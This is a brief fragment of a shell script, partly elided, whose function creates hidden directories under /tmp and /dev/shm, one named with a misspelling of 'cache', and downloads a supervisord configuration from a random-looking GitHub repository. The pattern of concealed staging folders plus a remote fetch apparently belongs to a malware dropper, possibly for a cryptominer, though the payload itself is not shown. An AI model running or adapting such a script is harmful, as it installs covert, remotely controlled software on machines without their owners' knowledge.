...
function fetch_files() {
    mkdir -p /tmp/.java/bin/{.a,.b}  /dev/shm/.cahe/{etc,log}
    ...
    cd /dev/shm/.cahe/etc && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/tmp/frsrv/n1.conf -o supervisord.conf
